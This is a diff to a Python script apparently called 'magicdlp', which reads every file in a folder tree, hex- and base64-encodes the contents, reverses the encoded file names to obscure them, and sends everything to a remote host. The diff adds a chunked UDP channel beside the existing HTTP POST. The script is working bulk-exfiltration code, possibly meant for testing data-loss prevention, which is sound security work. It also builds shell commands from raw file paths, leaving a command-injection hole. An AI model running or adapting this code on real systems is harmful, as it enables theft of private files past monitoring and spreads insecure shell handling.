@@ -1,34 +1,22 @@
 #!/usr/bin/python3
 
-# Need execute with root premissions in order to change TOR IP
 # Librerias importadas de 3os
 import requests  # Request to external site or api
 import urllib3  # Request to external site or api
 import sys  # To read arguments
 import json  # To parse json response
-import re  # To parse regular expressions
-import hashlib  # To create the email hash for certain webs
 import os
 import subprocess
 import argparse
 import platform
 import urllib
-import base64 # for leakpeek
-try:
-	from googlesearch import search
-except ImportError:
-	print("No module named 'google' found")
-from fpdf import FPDF
+import base64
+import socket
+import math
+import time
 
 
 sistema = format(platform.system())
-
-######## Global variables
-# proxy
-tor_proxy = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
-
-###################
-
 
 if (sistema == "Linux"):
 	# Text colors
@@ -49,9 +37,6 @@ elif (sistema == "Windows"):
 	detect_color = ""
 	banner_color=""
 	end_banner_color=""
-
-# Output Type
-onlyPasswords = False
 
 ######### Print banner
 
@@ -84,7 +69,10 @@ def checkArgs():
 	parser.add_argument('-rp', "--remoteport", action="store",
 						dest='remoteport',
 						help="Remote port")
-	
+	parser.add_argument('-u', "--udp", action="store_true",
+						dest='udp',
+						help="Use UDP Protocol, by default the tool is using TCP connections")
+
 	args = parser.parse_args()
 	if (len(sys.argv)==1) or (args.folder==False):
 		parser.print_help(sys.stderr)
@@ -95,7 +83,7 @@ def readfolders(directory):
 	last = len(directory)
 	if (directory[last-1] != "/"):
 		directory = directory + "/"
-	
+
 	#Only one folder
 	if not (args.recursive):
 		for path in os.listdir(directory):
@@ -109,7 +97,7 @@ def readfolders(directory):
 			if os.path.isfile(os.path.join(directory, path)) and args.destination==True:
 				getFiles(directory,path)
 			elif os.path.isfile(os.path.join(directory, path)) and args.remotehost:
-				remotehost(directory, path, args.remotehost, args.remoteport)				
+				remotehost(directory, path, args.remotehost, args.remoteport)
 			else:
 				if not (args.destination) and not (args.remotehost):
 					os.system("mkdir '/tmp/magicdlp" + directory+path + "'" )
@@ -123,8 +111,8 @@ def readfolders(directory):
 				elif (args.remotehost):
 					newdir = directory+path
 					readfolders(newdir)
-				
-					
+
+
 
 def getFiles(directory, path):
 	fullpath = directory + path
@@ -138,13 +126,13 @@ def getFiles(directory, path):
 		os.system("xxd -p '" + fullpath + "' | base64 -w 0 > '" + destination + fullpath + ".b64'" )
 	#if (rhost != ""):
 	#	remotehost("/home/magichk/seguridad/magicdlp/", "magicdlp.py", args.remotehost, args.remoteport)
-		
+
 
 def remotehost(directory, path, remotehost, remoteport):
 	fullpath = directory + path
 	#print (fullpath)
 	fullpath = fullpath.replace("'", "\'")
-	
+
 	data = os.popen("xxd -p '" + fullpath + "' | base64 -w 0").read()
 	#Name of the file encoded and reversed.
 	directory = base64.b64encode(directory.encode())
@@ -152,12 +140,76 @@ def remotehost(directory, path, remotehost, remoteport):
 
 	path = base64.b64encode(path.encode())
 	path = path[::-1]
-	
+
 	#Create a json with data.
 	jsondata = {"dir": directory, "name": path, "data": data}
 
-	url = "http://" + remotehost + ":" + remoteport
-	response = requests.post(url, json=jsondata)
+	try:
+		if args.udp:
+			# UDP Server 
+			
+			# create a socket object
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+			# define the server address and port
+			server_address = (remotehost, int(remoteport))
+			
+			#dividir en chunks.
+			chunk_size = 2048
+			total_data = len(data)
+			total_partes = total_data / chunk_size
+			
+			total_partes = math.ceil(total_partes) - 1 
+
+			i = 0
+			x = 1
+			part = 0
+			newdata = ""
+			
+			while (i <= total_data):
+				if (i == total_data and x > 0 ): # Si ya he llegado al total data pero la x no vale 0, me quedan datos por enviar
+					#Enviar chunk!
+					json_message = {"data":newdata,"name":path.decode(),"dir":directory.decode(), "part":str(part), "total" : str(total_partes)}
+					
+					# convert the JSON message to a bytes object
+					message = json.dumps(json_message).encode()
+
+					# send the message to the server
+					s.sendto(message, server_address)
+					#time.sleep(0.005)
+					
+				elif (x <= chunk_size):
+					newdata = newdata + data[i]
+				else:
+					# Tengo que poner el ultimo byte en newdata
+					newdata = newdata + data[i]
+					
+					#Enviar chunk!					
+					json_message = {"data":newdata,"name":path.decode(),"dir":directory.decode(), "part":str(part), "total" : str(total_partes)}
+
+					# convert the JSON message to a bytes object
+					message = json.dumps(json_message).encode()
+
+					# send the message to the server
+					s.sendto(message, server_address)
+					#time.sleep(0.005)
+					
+					part = part + 1 
+					x = 0
+					newdata = ""
+				x = x + 1
+				i = i + 1
+			
+			# close the socket
+			s.close() 
+
+
+		else:
+			#TCP Server
+			url = "http://" + remotehost + ":" + remoteport
+			response = requests.post(url, json=jsondata)
+	except:
+		pass
 
 ########## Main function #################3
 if __name__ == "__main__":
@@ -165,5 +217,5 @@ if __name__ == "__main__":
 		args = checkArgs()
 		if args.folder:
 			readfolders(args.folder)
-	except:
-		pass
+	except Exception as e :
+		print(e)
